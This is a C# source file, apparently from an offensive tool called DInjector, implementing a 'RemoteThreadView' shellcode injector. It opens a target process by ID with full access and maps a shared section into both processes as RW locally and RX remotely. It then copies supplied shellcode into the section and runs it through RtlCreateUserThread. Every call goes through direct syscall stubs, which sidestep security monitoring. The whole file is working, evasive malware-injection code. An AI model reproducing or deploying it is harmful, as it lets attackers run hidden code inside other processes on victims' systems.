using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class RemoteThreadView
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtOpenProcess(
            ref IntPtr ProcessHandle,
            DI.Data.Win32.Kernel32.ProcessAccessFlags DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtCreateSection(
            ref IntPtr SectionHandle,
            DI.Data.Win32.WinNT.ACCESS_MASK DesiredAccess,
            IntPtr ObjectAttributes,
            ref UInt32 MaximumSize,
            UInt32 SectionPageProtection,
            UInt32 AllocationAttributes,
            IntPtr FileHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            UIntPtr ZeroBits,
            UIntPtr CommitSize,
            out ulong SectionOffset,
            out uint ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS RtlCreateUserThread(
            IntPtr ProcessHandle,
            IntPtr ThreadSecurity,
            bool CreateSuspended,
            Int32 StackZeroBits,
            IntPtr StackReserved,
            IntPtr StackCommit,
            IntPtr StartAddress,
            IntPtr Parameter,
            ref IntPtr ThreadHandle,
            IntPtr ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtUnmapViewOfSection(
            IntPtr ProcessHandle,
            IntPtr BaseAddress);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        private static DI.Data.Native.NTSTATUS rtlCreateUserThread(
            IntPtr ProcessHandle,
            IntPtr ThreadSecurity,
            bool CreateSuspended,
            Int32 StackZeroBits,
            IntPtr StackReserved,
            IntPtr StackCommit,
            IntPtr StartAddress,
            IntPtr Parameter,
            ref IntPtr ThreadHandle,
            IntPtr ClientId)
        {
            object[] parameters = {
                ProcessHandle,
                ThreadSecurity,
                CreateSuspended,
                StackZeroBits,
                StackReserved,
                StackCommit,
                StartAddress,
                Parameter,
                ThreadHandle,
                ClientId};

            var result = (DI.Data.Native.NTSTATUS)DI.DynamicInvoke.Generic.DynamicAPIInvoke("ntdll.dll", "RtlCreateUserThread", typeof(RtlCreateUserThread), ref parameters);

            ThreadHandle = (IntPtr)parameters[8];
            return result;
        }

        private static bool closeHandle(IntPtr hObject)
        {
            object[] parameters = { hObject };
            return (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref parameters);
        }

        public static void Execute(byte[] shellcodeBytes, int processID)
        {
            var shellcode = shellcodeBytes;

            #region NtOpenProcess

            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtOpenProcess");
            NtOpenProcess sysNtOpenProcess = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));

            IntPtr rhProcess = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();

            CLIENT_ID ci = new CLIENT_ID { UniqueProcess = (IntPtr)processID };

            DI.Data.Native.NTSTATUS ntstatus;

            ntstatus = sysNtOpenProcess(
                ref rhProcess,
                DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa,
                ref ci);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadView) [+] NtOpenProcess");
            else
                Console.WriteLine($"(RemoteThreadView) [-] NtOpenProcess: {ntstatus}");

            #endregion

            #region NtCreateSection (PAGE_EXECUTE_READWRITE)

            // Create RWX memory section for the shellcode

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtCreateSection");
            NtCreateSection sysNtCreateSection = (NtCreateSection)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateSection));

            var hSection = IntPtr.Zero;
            var maxSize = (UInt32)shellcode.Length;

            ntstatus = sysNtCreateSection(
                ref hSection,
                DI.Data.Win32.WinNT.ACCESS_MASK.SECTION_MAP_READ | DI.Data.Win32.WinNT.ACCESS_MASK.SECTION_MAP_WRITE | DI.Data.Win32.WinNT.ACCESS_MASK.SECTION_MAP_EXECUTE,
                IntPtr.Zero,
                ref maxSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
                DI.Data.Win32.WinNT.SEC_COMMIT,
                IntPtr.Zero);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadView) [+] NtCreateSection, PAGE_EXECUTE_READWRITE");
            else
                Console.WriteLine($"(RemoteThreadView) [-] NtCreateSection, PAGE_EXECUTE_READWRITE: {ntstatus}");

            #endregion

            #region NtMapViewOfSection (PAGE_READWRITE)

            // Map the view of created section into the LOCAL process's virtual address space (as RW)

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtMapViewOfSection");
            NtMapViewOfSection sysNtMapViewOfSection = (NtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtMapViewOfSection));

            var lhProcess = Process.GetCurrentProcess().Handle;
            var lbaseAddress = IntPtr.Zero;

            ntstatus = sysNtMapViewOfSection(
                hSection,
                lhProcess,
                ref lbaseAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out ulong _,
                out maxSize,
                2, // InheritDisposition
                0, // AllocationType
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadView) [+] NtMapViewOfSection, PAGE_READWRITE");
            else
                Console.WriteLine($"(RemoteThreadView) [-] NtMapViewOfSection, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtMapViewOfSection (PAGE_EXECUTE_READ)

            // Map the view of (the same) created section into the REMOTE process's virtual address space (as RX)

            var rbaseAddress = IntPtr.Zero;

            ntstatus = sysNtMapViewOfSection(
                hSection,
                rhProcess,
                ref rbaseAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out ulong _,
                out maxSize,
                2, // InheritDisposition
                0, // AllocationType
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadView) [+] NtMapViewOfSection, PAGE_EXECUTE_READ");
            else
                Console.WriteLine($"(RemoteThreadView) [-] NtMapViewOfSection, PAGE_EXECUTE_READ: {ntstatus}");

            // Copy the shellcode into the locally mapped view which will be reflected on the remotely mapped view
            Marshal.Copy(shellcode, 0, lbaseAddress, shellcode.Length);

            #endregion

            #region RtlCreateUserThread

            // Execute the shellcode in a remote thread

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("RtlCreateUserThread");
            RtlCreateUserThread sysRtlCreateUserThread = (RtlCreateUserThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(RtlCreateUserThread));

            IntPtr hThread = IntPtr.Zero;

            ntstatus = rtlCreateUserThread(
                rhProcess,
                IntPtr.Zero,
                false, // CreateSuspended
                0, // StackZeroBits
                IntPtr.Zero,
                IntPtr.Zero,
                rbaseAddress,
                IntPtr.Zero,
                ref hThread,
                IntPtr.Zero);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadView) [+] RtlCreateUserThread");
            else
                Console.WriteLine($"(RemoteThreadView) [-] RtlCreateUserThread: {ntstatus}");

            #endregion

            #region NtUnmapViewOfSection

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtUnmapViewOfSection");
            NtUnmapViewOfSection sysNtUnmapViewOfSection = (NtUnmapViewOfSection)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtUnmapViewOfSection));

            sysNtUnmapViewOfSection(
                lhProcess,
                lbaseAddress);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadView) [+] NtUnmapViewOfSection");
            else
                Console.WriteLine($"(RemoteThreadView) [-] NtUnmapViewOfSection: {ntstatus}");

            #endregion

            closeHandle(hSection);
            closeHandle(rhProcess);
            closeHandle(lhProcess);
        }
    }
}
